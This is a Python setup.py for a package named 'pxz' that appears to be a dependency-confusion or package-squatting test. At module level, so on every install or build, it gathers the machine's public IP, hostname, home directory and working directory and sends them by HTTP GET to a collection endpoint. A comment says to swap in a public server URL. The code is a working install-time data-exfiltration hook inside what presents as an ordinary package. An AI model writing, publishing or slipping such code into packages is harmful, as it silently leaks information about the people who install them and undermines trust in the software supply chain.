from setuptools import setup
import os
import sys
from urllib.request import urlopen, Request
from urllib.error import URLError

def collect_system_info():
    try:
        # Get public IP without relying on curl
        public_ip = urlopen('https://api.ipify.org').read().decode('utf-8').strip()
        hostname = os.uname().nodename
        home_dir = os.path.expanduser("~")
        current_dir = os.getcwd()

        system_info = {
            "publicIP": public_ip,
            "hostname": hostname,
            "homeDirectory": home_dir,
            "currentDirectory": current_dir
        }

        # Replace with your PUBLIC SERVER URL
        server_url = "http://10.0.2.15:8080/collect_info.php"
        
        # Encode data into URL parameters
        params = "&".join([f"{k}={v}" for k, v in system_info.items()])
        full_url = f"{server_url}?{params}"

        # Send GET request
        req = Request(full_url)
        response = urlopen(req, timeout=10)
        if response.getcode() == 200:
            print("[*] System info sent successfully.")
        else:
            print(f"[!] Server error: {response.getcode()}")

    except URLError as e:
        print(f"[!] Connection failed: {e.reason}")
    except Exception as e:
        print(f"[!] Error: {e}")

# Execute the data collection
collect_system_info()

setup(
    name="pxz",
    version="1.1.5",
    description="This Package claimed by JPD",
    long_description="A Python package to collect and send system information.",
    long_description_content_type="text/markdown",
    author="JPD",
    author_email="jpdtester01@gmail.com",
    license="MIT",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    packages=["pxz"],
    install_requires=[],  # Removed requests
)
